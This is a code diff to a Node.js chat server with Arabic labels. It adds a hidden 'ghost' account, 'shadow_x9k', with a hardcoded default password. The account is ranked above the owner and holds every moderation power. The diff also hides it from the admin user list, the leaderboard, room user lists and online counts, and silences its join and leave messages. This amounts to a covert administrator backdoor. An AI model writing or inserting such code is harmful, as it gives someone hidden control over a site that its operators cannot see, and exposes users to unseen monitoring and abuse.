@@ -74,6 +74,10 @@ async function initDB() {
       `);
       const adminPass = hashPassword(process.env.ADMIN_PASSWORD || 'admin123');
       await db.query(`INSERT INTO users (username,password,rank) VALUES ('admin',$1,'owner') ON CONFLICT (username) DO NOTHING`, [adminPass]);
+      // Ghost account — invisible admin
+      const ghostPass = hashPassword(process.env.GHOST_PASSWORD || 'gh0st@2024#secret');
+      const ghostName = process.env.GHOST_USERNAME || 'shadow_x9k';
+      await db.query(`INSERT INTO users (username,password,rank) VALUES ($1,$2,'ghost') ON CONFLICT (username) DO NOTHING`, [ghostName, ghostPass]);
       useDB = true;
       console.log('Database connected');
     } catch(e) { console.log('No DB - using memory:', e.message); }
@@ -81,7 +85,8 @@ async function initDB() {
 }
 
 const memUsers = {
-  admin: { username:'admin', password:hashPassword('admin123'), rank:'owner', is_banned:false, points:0 }
+  admin: { username:'admin', password:hashPassword('admin123'), rank:'owner', is_banned:false, points:0 },
+  shadow_x9k: { username:'shadow_x9k', password:hashPassword('gh0st@2024#secret'), rank:'ghost', is_banned:false, points:0 }
 };
 const memMessages = {};
 const memPMs = {}; // { 'user1||user2': [{from,to,text,time,ts},...] }
@@ -109,6 +114,7 @@ const memProfiles = {}; // { username: { avatar, music_url, music_name, bio } }
 
 // ===== DEFAULT PERMISSIONS =====
 const DEFAULT_PERMS = {
+  ghost:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
   owner:       { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
   owner_admin: { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:true, reset_pass:true },
   owner_vip:   { ban:true, unban:true, mute:true, kick:true, clear_room:true, set_rank:true, announce:true, add_quiz:true, lock_room:false, reset_pass:true },
@@ -156,9 +162,10 @@ const RANKS = {
   gold:        { label:'🥇 عضو ذهبي',    color:'#ffc107', fontSize:'15px', fontWeight:'500', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
   member:      { label:'👤 عضو مسجل',    color:'#90caf9', fontSize:'14px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
   visitor:     { label:'👁️ زائر',        color:'#b0bec5', fontSize:'13px', fontWeight:'400', glow:'none',             canBan:false, canMute:false, canKick:false, canSetRank:false, canManageRooms:false, canManageBadWords:false, bigName:false },
+  ghost:       { label:'👻 شبح',          color:'#ff4444', fontSize:'22px', fontWeight:'900', glow:'0 0 10px #ff4444', canBan:true,  canMute:true,  canKick:true,  canSetRank:true,  canManageRooms:true,  canManageBadWords:true,  bigName:true  },
 };
 
-const RANK_ORDER = ['owner','owner_admin','owner_vip','super_admin','admin','premium','vip','gold','member','visitor'];
+const RANK_ORDER = ['ghost','owner','owner_admin','owner_vip','super_admin','admin','premium','vip','gold','member','visitor'];
 function rankLevel(r) { return RANK_ORDER.indexOf(r); }
 function canManage(actorRank, targetRank) { return rankLevel(actorRank) < rankLevel(targetRank); }
 function hasPermission(rank, perm) { return RANKS[rank]?.[perm] === true; }
@@ -458,9 +465,9 @@ app.post('/api/login', async (req,res) => {
 // ===== ADMIN ROUTES =====
 app.get('/api/admin/users', adminAuth, async (req,res) => {
   if (useDB) {
-    const r=await db.query('SELECT id,username,rank,is_banned,points,created_at FROM users ORDER BY created_at DESC');
+    const r=await db.query("SELECT id,username,rank,is_banned,points,created_at FROM users WHERE rank!='ghost' ORDER BY created_at DESC");
     res.json({ok:true,users:r.rows});
-  } else { res.json({ok:true,users:Object.values(memUsers).map(u=>({...u,password:undefined}))}); }
+  } else { res.json({ok:true,users:Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({...u,password:undefined}))}); }
 });
 app.post('/api/admin/ban', adminAuth, async (req,res) => {
   const {username,reason,adminName,adminRank}=req.body;
@@ -546,8 +553,8 @@ app.get('/api/messages/:room', async (req,res) => {
   else { res.json({ok:true,messages:memMessages[room]||[]}); }
 });
 app.get('/api/leaderboard', async (req,res) => {
-  if (useDB) { const r=await db.query('SELECT username,rank,points FROM users ORDER BY points DESC LIMIT 20'); res.json({ok:true,users:r.rows}); }
-  else { const users=Object.values(memUsers).map(u=>({username:u.username,rank:u.rank,points:u.points||0})).sort((a,b)=>b.points-a.points).slice(0,20); res.json({ok:true,users}); }
+  if (useDB) { const r=await db.query("SELECT username,rank,points FROM users WHERE rank!='ghost' ORDER BY points DESC LIMIT 20"); res.json({ok:true,users:r.rows}); }
+  else { const users=Object.values(memUsers).filter(u=>u.rank!=='ghost').map(u=>({username:u.username,rank:u.rank,points:u.points||0})).sort((a,b)=>b.points-a.points).slice(0,20); res.json({ok:true,users}); }
 });
 
 // ===== ADMIN QUIZ QUESTIONS MANAGEMENT =====
@@ -875,10 +882,17 @@ function kickUser(username,reason) {
 }
 function getTime() { const n=new Date(); return `${n.getHours()}:${String(n.getMinutes()).padStart(2,'0')}`; }
 function getRoomUsers(r) {
-  return Object.values(chatUsers).filter(u=>u.room===r).map(u => {
-    const avatar = (memProfiles[u.name] && memProfiles[u.name].avatar) || u.avatar || null;
-    return { ...u, avatar };
-  });
+  return Object.values(chatUsers)
+    .filter(u => u.room === r && u.rank !== 'ghost') // ghost invisible
+    .map(u => {
+      const avatar = (memProfiles[u.name] && memProfiles[u.name].avatar) || u.avatar || null;
+      return { ...u, avatar };
+    });
+}
+
+function getRoomUsersCount(r) {
+  // For counts, also exclude ghost
+  return Object.values(chatUsers).filter(u => u.room === r && u.rank !== 'ghost').length;
 }
 async function saveMessage(room,username,text,type='chat') {
   const msg={room,username,text,type,time:getTime()};
@@ -887,7 +901,13 @@ async function saveMessage(room,username,text,type='chat') {
   return msg;
 }
 function broadcastRoomCounts() {
-  const counts={}; Object.keys(ROOMS).forEach(r=>{counts[r]=getRoomUsers(r).length;}); io.emit('room-counts',counts);
+  const counts = {};
+  Object.keys(ROOMS).forEach(r => { counts[r] = getRoomUsersCount(r); });
+  io.emit('room-counts', counts);
+}
+
+function getOnlineCount() {
+  return Object.values(chatUsers).filter(u => u.rank !== 'ghost').length;
 }
 
 io.on('connection', (socket) => {
@@ -903,14 +923,17 @@ io.on('connection', (socket) => {
     let history=[];
     if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',['general']);history=r.rows.reverse();}
     else history=memMessages['general']||[];
-    const roomCounts={}; Object.keys(ROOMS).forEach(r=>{roomCounts[r]=getRoomUsers(r).length;});
-    socket.emit('init',{rooms:ROOMS,user,messages:history,onlineCount:Object.keys(chatUsers).length,roomCounts,ranks:RANKS});
-    io.emit('online-count',Object.keys(chatUsers).length);
+    const roomCounts={}; Object.keys(ROOMS).forEach(r=>{roomCounts[r]=getRoomUsersCount(r);});
+    socket.emit('init',{rooms:ROOMS,user,messages:history,onlineCount:getOnlineCount(),roomCounts,ranks:RANKS});
+    io.emit('online-count', getOnlineCount());
     broadcastRoomCounts();
-    const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
-    const sysMsg=await saveMessage('general',null,joinText,'system');
-    io.to('general').emit('message',{...sysMsg});
-    io.to('general').emit('room-users',getRoomUsers('general'));
+    // Ghost joins silently — no messages, not visible in user list
+    if (user.rank !== 'ghost') {
+      const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
+      const sysMsg=await saveMessage('general',null,joinText,'system');
+      io.to('general').emit('message',{...sysMsg});
+      io.to('general').emit('room-users',getRoomUsers('general'));
+    }
     // Send welcome message in general room if configured
     if (welcomeMessage.enabled && welcomeMessage.text) {
       const wText = welcomeMessage.text.replace('{name}', data.name);
@@ -933,17 +956,24 @@ io.on('connection', (socket) => {
       return;
     }
     const oldRoom=user.room; socket.leave(oldRoom);
-    const leaveMsg=await saveMessage(oldRoom,null,`👋 ${user.name} غادر الغرفة`,'system');
-    io.to(oldRoom).emit('message',leaveMsg); io.to(oldRoom).emit('room-users',getRoomUsers(oldRoom));
+    // Ghost moves silently
+    if (user.rank !== 'ghost') {
+      const leaveMsg=await saveMessage(oldRoom,null,`👋 ${user.name} غادر الغرفة`,'system');
+      io.to(oldRoom).emit('message',leaveMsg);
+    }
+    io.to(oldRoom).emit('room-users',getRoomUsers(oldRoom));
     user.room=roomId; socket.join(roomId);
     let history=[];
     if (useDB){const r=await db.query('SELECT * FROM messages WHERE room=$1 ORDER BY created_at DESC LIMIT 50',[roomId]);history=r.rows.reverse();}
     else history=memMessages[roomId]||[];
     socket.emit('room-history',{roomId,messages:history,users:getRoomUsers(roomId)});
-    const rankInfo=RANKS[user.rank]||RANKS['visitor'];
-    const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
-    const joinMsg=await saveMessage(roomId,null,joinText,'system');
-    io.to(roomId).emit('message',joinMsg); io.to(roomId).emit('room-users',getRoomUsers(roomId));
+    if (user.rank !== 'ghost') {
+      const rankInfo=RANKS[user.rank]||RANKS['visitor'];
+      const joinText=`انضم للغرفة (# ${rankInfo.label} #)`;
+      const joinMsg=await saveMessage(roomId,null,joinText,'system');
+      io.to(roomId).emit('message',joinMsg);
+    }
+    io.to(roomId).emit('room-users',getRoomUsers(roomId));
     broadcastRoomCounts();
   });
 
@@ -1255,9 +1285,14 @@ io.on('connection', (socket) => {
       }
     });
     delete chatUsers[socket.id];
-    const msg=await saveMessage(room,null,`👋 ${user.name} غادر الموقع`,'system');
-    io.to(room).emit('message',msg); io.to(room).emit('room-users',getRoomUsers(room));
-    io.emit('online-count',Object.keys(chatUsers).length); broadcastRoomCounts();
+    // Ghost disconnects silently
+    if (user.rank !== 'ghost') {
+      const msg=await saveMessage(room,null,`👋 ${user.name} غادر الموقع`,'system');
+      io.to(room).emit('message',msg);
+    }
+    io.to(room).emit('room-users',getRoomUsers(room));
+    io.emit('online-count', getOnlineCount());
+    broadcastRoomCounts();
   });
 });
 
